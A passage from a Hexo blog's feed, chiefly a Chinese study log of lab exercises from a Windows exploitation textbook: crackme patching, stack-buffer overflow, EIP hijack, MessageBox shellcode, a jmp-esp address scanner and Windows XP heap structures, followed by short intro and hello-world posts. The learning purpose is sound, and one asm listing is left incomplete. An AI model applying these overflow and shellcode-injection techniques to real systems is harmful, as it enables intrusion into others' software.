href="https://en.wikipedia.org/wiki/Execution_(computing)">executed</a> or evaluated</p></blockquote><blockquote><p>Control flow Statement（控制流语句）</p><ul><li>无条件分支或跳转</li><li>条件分支</li><li>循环判断分支</li><li>子例程、协程</li><li>无条件停止</li></ul></blockquote><blockquote><p>程序分析中难免会碰到路径爆炸问题</p><p>我们通常采用flow merge</p><p>来完成Over-approximation</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NJU-Static-Analysis-Introduction&quot;&gt;&lt;a href=&quot;#NJU-Static-Analysis-Introduction&quot; class=&quot;headerlink&quot; title=&quot;NJU Static Analysis - Introd</summary>
      
    
    
    
    
    <category term="Static Analysis" scheme="http://example.com/tags/Static-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>0day2-Practice</title>
    <link href="http://example.com/2024/03/13/0day2-Practice/"/>
    <id>http://example.com/2024/03/13/0day2-Practice/</id>
    <published>2024-03-13T12:48:44.000Z</published>
    <updated>2024-04-23T12:05:57.583Z</updated>
    
    <content type="html"><![CDATA[<p>对书籍《0day软件漏洞精要分析-第二版》中的样本进行了调试分析</p><p>很喜欢书中的一句话：</p><blockquote><p>所有漂亮的 exploits 背后都隐藏着无数个对着寄存器发呆的不眠之夜</p></blockquote><p>复现参考：<a href="https://blog.wohin.me/">https://blog.wohin.me/</a></p><h1 id="《0day2》实战笔记：part1-基础知识"><a href="#《0day2》实战笔记：part1-基础知识" class="headerlink" title="《0day2》实战笔记：part1 - 基础知识"></a>《0day2》实战笔记：part1 - 基础知识</h1><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><blockquote><p>记录调试代码时碰到的不懂或有趣、顿悟的地方</p></blockquote><p>Ollydbg，首先调试到需要进行标准输入的地方</p><p>在调用<code>scanf</code>地方，从标准输入流中读入的数据写在栈上的位置</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047178.png" alt="image-20240311170006867"></p><p>写入后然后调用<code>crack_me.00401000</code>，进入后查看到字符串，我们很直接的猜测可能就是密码</p><p>调试的时候发现，执行了一个循环的过程，然后进行字符的比较</p><p>一个思路就是直接输入<code>1234567</code>通关</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047024.png" alt="image-20240311170545410"></p><p>第二个思路就是打<code>patch</code>，修改汇编语句为<code>jne short 0040107F</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047835.png" alt="image-20240311170820051"></p><p>正确的patch应该是使用010editor类工具修改PE文件中的二进制数据，此处不再演示了。</p><h1 id="《0day2》实战笔记：part2-栈溢出原理与实践"><a href="#《0day2》实战笔记：part2-栈溢出原理与实践" class="headerlink" title="《0day2》实战笔记：part2 - 栈溢出原理与实践"></a>《0day2》实战笔记：part2 - 栈溢出原理与实践</h1><h2 id="Lab-1"><a href="#Lab-1" class="headerlink" title="Lab"></a>Lab</h2><p>IDA反汇编，存在栈溢出</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047146.png" alt="image-20240313160741662"></p><p>攻击思路有：</p><ul><li>使用栈溢出覆盖栈上的数据，完成变量覆盖</li><li>使用栈溢出劫持EIP，改变程序的执行流</li><li>shellcode注入</li></ul><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>IDA静态分析的时候发现了</p><p>最终密码校验的v3标志位和strcpy中的v3在栈上的关系如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046462.png" alt="image-20240313165112432"></p><p>查看源码，v2完全可控</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046496.png" alt="image-20240313165149755"><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046580.png" alt="image-20240313165255488"></p><p>只需要偏移8个字节，就可以覆盖，输入类似<code>aaaaaaaa</code>即可符合验证</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046811.png" alt="image-20240313165506654"></p><h3 id="劫持eip"><a href="#劫持eip" class="headerlink" title="劫持eip"></a>劫持eip</h3><p>既然可以覆盖变量，何不覆盖掉返回地址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046409.png" alt="image-20240313185613942"></p><p>主要看大端小端序，可以动态调试的时候查看</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046930.png" alt="image-20240313185534207"></p><p>报错是因为覆盖掉上一个栈帧地址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046007.png" alt="image-20240313185520386"></p><h3 id="栈上的shellcode注入"><a href="#栈上的shellcode注入" class="headerlink" title="栈上的shellcode注入"></a>栈上的shellcode注入</h3><p>我们搓出shellcode如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx</span><br><span class="line">push ebx</span><br><span class="line">push 626F6A2D</span><br><span class="line">push 646F6F67</span><br><span class="line">mov eax, esp</span><br><span class="line">push ebx ; uType</span><br><span class="line">push eax ; lpCaption</span><br><span class="line">push eax ; lpText</span><br><span class="line">push ebx ; hWnd</span><br><span class="line">mov eax, 0x77D507EA; 需要查看MessageBox的地址 = addr(User32.dll) + addr(offset)</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046721.png" alt="image-20240313191430059"></p><p>然后使用pwntools的asm模块，将汇编转字节码，当然也可以使用AI工具帮忙转，然后就是查看栈溢出点</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046158.png" alt="image-20240313204123973"></p><p>偏移0x30+0x4，然后再填入4字节的跳转到shellcode地址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046485.png" alt="image-20240313204142563"></p><p>动态调试查看写入点的基址，一个trick是可以写一些显眼的脏数据查看</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046922.png" alt="image-20240313204441148"></p><p>所以写入buffer的数据为如下，<code>0x90</code>对应着<code>nop</code>，注意小端</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046338.png"></p><p>弹窗成功</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046999.png" alt="image-20240313203833764"></p><h1 id="《0day2》实战笔记：part3-开发shellcode的艺术"><a href="#《0day2》实战笔记：part3-开发shellcode的艺术" class="headerlink" title="《0day2》实战笔记：part3 - 开发shellcode的艺术"></a>《0day2》实战笔记：part3 - 开发shellcode的艺术</h1><h2 id="jmp-esp技术"><a href="#jmp-esp技术" class="headerlink" title="jmp esp技术"></a>jmp esp技术</h2><p>主要是如果将<code>shellcode</code>注入到函数的栈空间中，可能由于动态链接库的装载导致<code>shellcode</code>的定位出现问题</p><p>做法就是（如图所示），将<code>shellcode</code>写入到<code>ret</code>指令之前的栈里（可以先填充一段<code>nop</code>指令提高利用的成功率），然后在<code>ret</code>位置覆盖为指令<code>jmp esp</code>的地址作为跳板（这个可以通过爆搜内存进行查找）</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316152639936.png" alt="image-20240316152639936"></p><h3 id="内存搜索"><a href="#内存搜索" class="headerlink" title="内存搜索"></a>内存搜索</h3><p>内存搜索的相关代码解析：</p><p>思路就是LoadLibrary将DLL映射到当前进程的内存空间后，进行爆搜，粗暴而有效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_NAME <span class="string">&quot;user32.dll&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    <span class="type">int</span> position, address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    <span class="comment">// HINSTANCE</span></span><br><span class="line">    <span class="comment">// 实例或模块的句柄, 当可执行文件或dll加载到内存中, 使用句柄识别</span></span><br><span class="line">    </span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    <span class="comment">// 使用winapi - LoadLibray加载dll到当前进程的内存空间中</span></span><br><span class="line">    handle = LoadLibrary(DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>(!handle)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; load dll erro !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ptr=(BYTE*)handle;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 爆搜内存</span></span><br><span class="line">    <span class="keyword">for</span>(position=<span class="number">0</span>;!done_flag;position++)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 检测相关内存字节</span></span><br><span class="line">            <span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 0xFFE4: jmp esp</span></span><br><span class="line">                <span class="comment">// 计算偏移</span></span><br><span class="line">                <span class="type">int</span> address = (<span class="type">int</span>)ptr+position;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;jmp esp opcode found at 0x%x\n&quot;</span>, address);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(...)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> address = (<span class="type">int</span>)ptr + position;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;END at 0x%x&quot;</span>, address);</span><br><span class="line">            done_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里笔者其实有个疑惑，既然将DLL加载到主进程的内存空间中，那么爆搜到的内存地址不应该是主进程中的内存地址吗？</p><p>经过调试，LoadLibrary返回了一个句柄（Windows上的句柄的概念类似于Linux中的文件描述符），通过句柄，我们可以访问动态链接库中的资源。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403161750387.png" alt="image-20240316171819858"></p><h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>之后就是exploit</p><p>在这之前，需要查看：</p><ul><li><code>kernel32.dll</code>中的<code>exit</code>：<code>0x7C81CB12</code></li></ul><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316182542021.png" alt="image-20240316182542021"></p><ul><li>MessageBox的函数地址：<code>0x77D507EA</code></li></ul><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    <span class="type">char</span> dllbuf[<span class="number">11</span>]=<span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dllbuf);<span class="comment">// 主进程获得dllbuf的句柄</span></span><br><span class="line">    </span><br><span class="line">    _asm&#123;</span><br><span class="line">        sub sp, <span class="number">0x440</span></span><br><span class="line">        xor ebx, ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push <span class="number">0x626F6A2D</span></span><br><span class="line">        push <span class="number">0x646F6F67</span></span><br><span class="line">        mov eax, esp</span><br><span class="line">        push ebx</span><br><span class="line">        push eax</span><br><span class="line">        push eax</span><br><span class="line">        push ebx</span><br><span class="line">        mov eax</span><br><span class="line">        call eax</span><br><span class="line">        push ebx</span><br><span class="line">        call ebx</span><br><span class="line">        mov eax</span><br><span class="line">        call eax</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用OD调试时转储shellcode</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316193617076.png" alt="image-20240316193617076"></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>此部分演示使用上个lab的shellcode</p><p>黑色高亮部分是<code>jmp esp</code>，然后用nop填充，再存shellcode，最后nop填充</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316210000114.png" alt="image-20240316210000114"></p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316205900434.png" alt="image-20240316205900434"></p><h2 id="抬高esp保护shellcode的完整性"><a href="#抬高esp保护shellcode的完整性" class="headerlink" title="抬高esp保护shellcode的完整性"></a>抬高esp保护shellcode的完整性</h2><p>多搞点nop？</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316211045486.png" alt="image-20240316211045486"></p><h1 id="《0day2》实战笔记：part5-堆溢出利用"><a href="#《0day2》实战笔记：part5-堆溢出利用" class="headerlink" title="《0day2》实战笔记：part5 - 堆溢出利用"></a>《0day2》实战笔记：part5 - 堆溢出利用</h1><p>微软操作系统堆管理机制发展大致分为三个阶段：</p><ul><li>Windows 2000 ~ Windows XP SP1 堆管理系统没有丝毫考虑安全</li><li>Windows XP2 ~ Windows 2003 ，加入安全因素，如修改块首格式并加入cookie，双向链表节点在删除时会做指针验证</li><li>Windows Vista ~ Windows 7 是堆管理算法的里程碑</li></ul><p>书中主要涉及Windows 2000 ~ Windows XP SP1平台的堆管理策略</p><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><p>程序员申请内存返回的指针指向的是块身</p><p>块首对程序员是透明的，堆表中只索引所有空闲堆块</p><p><img src="https://blog.wohin.me/posts/0day-chp05/02DF49A0-7682-40CF-9D3A-1115539C167D.png" alt="img"></p><p>两种堆表：</p><ul><li>空闲双向链表，Freelist（空表）</li></ul><p>块首包含两个指针，用于组织双向链表</p><p><code>free[1]</code>标识堆中所有8字节空闲堆块，然后从<code>1</code>到<code>127</code>呈现按8字节大小进行递增</p><p><code>free[0]</code>存储的是所有<code>1024B &lt; x &lt; 512KB</code>的空闲堆块，按大小升序</p><p><img src="https://blog.wohin.me/posts/0day-chp05/A6E0ACB6-7159-40A3-88F2-8FE49ADD30B5.png" alt="img"></p><ul><li>快速单向链表，Lookaside（快表）</li></ul><h2 id="堆操作"><a href="#堆操作" class="headerlink" title="堆操作"></a>堆操作</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;对书籍《0day软件漏洞精要分析-第二版》中的样本进行了调试分析&lt;/p&gt;
&lt;p&gt;很喜欢书中的一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;所有漂亮的 exploits 背后都隐藏着无数个对着寄存器发呆的不眠之夜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;复现参考：&lt;a </summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Binary-life</title>
    <link href="http://example.com/2024/03/10/BinSec-Life/"/>
    <id>http://example.com/2024/03/10/BinSec-Life/</id>
    <published>2024-03-10T14:34:45.000Z</published>
    <updated>2024-03-24T09:25:28.485Z</updated>
    
    <content type="html"><![CDATA[<h1 id="之源"><a href="#之源" class="headerlink" title="之源"></a>之源</h1><p><strong>凡事得知源起，谨以此博客记录我的二进制安全学习之路</strong>🗡</p><p><strong>祝你好运</strong></p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403102243940.jpg" style="zoom: 50%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;之源&quot;&gt;&lt;a href=&quot;#之源&quot; class=&quot;headerlink&quot; title=&quot;之源&quot;&gt;&lt;/a&gt;之源&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;凡事得知源起，谨以此博客记录我的二进制安全学习之路&lt;/strong&gt;🗡&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;祝你好运&lt;/stro</summary>
      
    
    
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2024/01/14/hello-world/"/>
    <id>http://example.com/2024/01/14/hello-world/</id>
    <published>2024-01-14T03:13:24.019Z</published>
    <updated>2024-01-14T03:13:24.020Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
